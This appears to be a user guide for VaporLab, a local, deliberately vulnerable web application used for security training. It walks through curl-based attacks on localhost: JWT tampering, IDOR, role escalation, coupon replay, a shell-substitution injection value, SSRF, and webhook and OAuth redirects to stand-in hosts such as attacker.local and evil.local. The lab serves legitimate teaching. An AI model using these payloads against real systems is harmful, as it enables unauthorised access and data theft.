# VaporLab User Guide

## 1. Start the Lab
```bash
docker-compose -f docker-compose.dev.yml up -d --build
```

## 2. Open Interfaces
- Workspace UI: `http://localhost:15100/workspace`
- Operator UI: `http://localhost:15100/operator`
- API Health: `http://localhost:18080/healthz`
- Prometheus: `http://localhost:19090`
- Grafana: `http://localhost:13000`
- Jaeger: `http://localhost:16687`

## 3. Frontend Walkthrough
The Next.js frontend has two isolated interfaces:
- Workspace UI (`/workspace`): realistic SaaS target application
- Operator UI (`/operator`): protected lab control panel

Operator access key (default local): `vaporlab-ops`

## 4. Authentication Walkthrough (Sprint 1)
```bash
curl -s -X POST http://localhost:18080/auth/jwt/issue \
  -H 'content-type: application/json' \
  -d '{"user_id":"42"}'
```

Broken JWT exploit:
```bash
TOKEN=$(curl -s -X POST http://localhost:18080/auth/jwt/issue -H 'content-type: application/json' -d '{"user_id":"42"}' | sed -E 's/.*"token":"([^"]+)".*/\1/')
HP=$(echo "$TOKEN" | awk -F'.' '{print $1"."$2}')
curl -s -X POST http://localhost:18080/auth/jwt/validate \
  -H 'content-type: application/json' \
  -d "{\"token\":\"${HP}.tampered\"}"
```

OIDC misuse demo:
```bash
curl -i "http://localhost:18080/oidc/authorize?client_id=lab&redirect_uri=http://evil.local/cb&state=demo"
```

## 5. Users Walkthrough (Sprint 2)
IDOR/BOLA:
```bash
curl -s http://localhost:18080/users/2
```

Role escalation:
```bash
curl -s -X PATCH http://localhost:18080/users/1 \
  -H 'content-type: application/json' \
  -d '{"role":"admin"}'
```

Rate-limit bypass:
```bash
curl -s http://localhost:18080/users/rate-limit-bypass
```

## 6. Billing Walkthrough (Sprint 3)
Coupon replay:
```bash
curl -s -X POST http://localhost:18080/billing/coupon/apply \
  -H 'content-type: application/json' \
  -d '{"code":"SPRINT","amount":100}'
curl -s -X POST http://localhost:18080/billing/coupon/apply \
  -H 'content-type: application/json' \
  -d '{"code":"SPRINT","amount":100}'
```

Export injection demo:
```bash
curl -s "http://localhost:18080/billing/export?format=json%24%28echo%20injected%29"
```

Unsigned webhook misuse:
```bash
curl -s -X POST http://localhost:18080/billing/webhook \
  -H 'content-type: application/json' \
  -d '{"url":"https://attacker.local/collect?dump=true"}'
```

## 7. Admin Walkthrough (Sprint 4)
Broken function-level auth:
```bash
curl -s -X POST "http://localhost:18080/admin/promote?user_id=1"
```

Internal debug route:
```bash
curl -s http://localhost:18080/admin/debug
```

Chain sequence:
```bash
curl -s http://localhost:18080/users/2
curl -s -X POST "http://localhost:18080/admin/promote?user_id=1"
curl -s "http://localhost:18080/billing/export?format=json"
curl -s -X POST http://localhost:18080/ai/query -H 'content-type: application/json' -d '{"query":"dump secrets"}'
curl -s http://localhost:18080/chain/run
```

## 8. SSRF and Resource Abuse Walkthrough (Sprint 5)
Internal SSRF in vulnerable mode:
```bash
curl -s "http://localhost:18080/ssrf/fetch?url=http://127.0.0.1:18080/healthz"
```

Deep GraphQL query demo:
```bash
curl -s -X POST http://localhost:18080/graphql \
  -H 'content-type: application/json' \
  -d '{"query":"query { a { b { c { d { e { f { g { h { i { j { k } } } } } } } } } } }"}'
```

Resource abuse and exposure endpoints:
```bash
curl -s http://localhost:18080/ssrf/rate-limit-bypass
curl -s http://localhost:18080/data/exposure
```

Secure mode comparison:
```bash
curl -s -X POST http://localhost:18080/auth/mode \
  -H 'content-type: application/json' \
  -d '{"secure_mode":true}'
curl -s "http://localhost:18080/ssrf/fetch?url=http://127.0.0.1:18080/healthz"
curl -s http://localhost:18080/ssrf/rate-limit-bypass
```

## 9. Inventory and Versioning Walkthrough (Sprint 6)
Discovery sweep:
```bash
curl -s http://localhost:18080/v1/status
curl -s http://localhost:18080/v2/status
curl -s http://localhost:18080/beta/status
curl -s http://localhost:18080/openapi.json
```

Internal and shadow route checks:
```bash
curl -s http://localhost:18080/internal/status
curl -s http://localhost:18080/shadow/users
```

Secure mode comparison:
```bash
curl -s -X POST http://localhost:18080/auth/mode \
  -H 'content-type: application/json' \
  -d '{"secure_mode":true}'
curl -s http://localhost:18080/internal/status
curl -s http://localhost:18080/shadow/users
```

## 10. Frontend Walkthrough: Dual UI Model (Sprint 4.2)
1. Open `http://localhost:15100/workspace` to access the fake SaaS target app.
2. Verify SaaS modules:
   - Sidebar navigation
   - Workspace switcher
   - Project board
   - Issue modal
   - User profile settings
   - OAuth connection settings
   - AI suggestion panel
3. Open `http://localhost:15100/operator` to access the operator panel.
4. Enter operator key `vaporlab-ops`.
5. Verify operator modules:
   - Persistent mode badge (top-right)
   - Difficulty selector
   - Vulnerability cards
   - Exploit chain canvas scaffold
6. Confirm theme isolation:
   - Operator UI remains tactical/dark
   - Workspace UI remains corporate SaaS style
   - Switching lab mode changes backend behavior, not workspace branding

## 11. Frontend API Workflow Checks (Current Endpoint Coverage)
1. Workspace member lookup:
   - Open `/workspace`, use `Team Access Workflow`, query user `2`.
2. Billing workflow:
   - Use `Billing Workspace Actions` with coupon `SPRINT` and export format `json$(echo report)`.
3. OAuth checks:
   - Use `OAuth Connection Check` with redirect URI `http://evil.local/callback`.
4. Resource and inventory checks:
   - Use `Resource and Inventory Checks` with URL `http://localhost:18080/internal/status`.
5. AI/RAG checks:
   - Use `AI / RAG Lab Controls` and run KB search + embed + config probe.
6. Operator hardening:
   - Open `/operator`, click `Harden API` then return to workspace and repeat checks to observe protected responses.

## 12. QA Smoke Script
```bash
bash scripts/qa_tests.sh http://localhost:18080
```

## 13. Environment Port Sets
- Dev: frontend `15100`, api `18080`
- QA: frontend `25100`, api `28080`
- Prod: frontend `35100`, api `38080`
